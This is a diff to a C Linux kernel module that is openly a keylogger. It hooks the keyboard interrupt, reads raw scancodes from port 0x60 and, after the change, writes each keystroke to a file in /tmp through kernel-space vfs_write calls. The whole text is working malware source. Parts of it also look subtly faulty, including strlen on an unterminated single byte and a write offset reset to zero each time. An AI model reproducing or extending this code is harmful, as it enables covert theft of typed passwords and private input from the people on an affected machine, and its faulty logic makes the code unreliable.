@@ -11,7 +11,7 @@
 // Functions
 struct file *file_open(const char *path, int flags, int rights);
 void file_close(struct file *file);
-int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
+void file_write(char *data);
 
 irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs);
 void __exit irq_cleanup(void);
@@ -23,7 +23,7 @@ static struct file *keylog = NULL;
 // Initialize the module − register the IRQ handler
 int init_module() {
 	printk(KERN_ALERT "Keylogger started");
-	keylog = file_open("/tmp/teclas_secretas_que_foram_digitas.txt", O_RDWR | O_CREAT, 0644);
+	keylog = file_open("/tmp/teclas_secretas_que_foram_digitas.txt", O_WRONLY | O_APPEND | O_CREAT, 0644);
 
 
 	return request_irq(1, (irq_handler_t) irq_handler, IRQF_SHARED, "keylogger", (void *)(&keylogger));
@@ -32,20 +32,18 @@ int init_module() {
 // This function services keyboard interrupts.
 irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs) {
 	static unsigned char scancode;
-
+	char *key = NULL;
 
 	scancode = inb(0x60); // Get scancode from specific input port.
-
-
+	
+	key = (char*) &scancode;
 
 	printk("Not mapped key!\n");
 	printk("Key was: %#2x in hexadecimal\n", scancode);
 	printk("Key was: %d in decimal\n\n", scancode);
+	printk("Key was: %s in decimal\n\n", key);
 
-	// unsigned char *key = &scancode;
-	// file_write(keylog, 0, *key, sizeof(*key));
-
-	//file_close(keylog);
+	file_write(key);
 
 	return (irq_handler_t) IRQ_HANDLED;
 }
@@ -64,7 +62,7 @@ struct file *file_open(const char *path, int flags, int rights){
     int err = 0;
 
     oldfs = get_fs();
-    set_fs(get_ds());
+    set_fs(KERNEL_DS);
     filp = filp_open(path, flags, rights);
     set_fs(oldfs);
     if (IS_ERR(filp)) {
@@ -78,17 +76,16 @@ void file_close(struct file *file){
     filp_close(file, NULL);
 }
 
-int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size){
+void file_write(char *data){
     mm_segment_t oldfs;
-    int ret;
+		loff_t pos = 0;
 
     oldfs = get_fs();
-    set_fs(get_ds());
+    set_fs(KERNEL_DS);
 
-    ret = vfs_write(file, data, size, &offset);
-
+		vfs_write(keylog, data, strlen(data), &pos);
     set_fs(oldfs);
-    return ret;
+
 }
 
 module_exit(irq_cleanup);
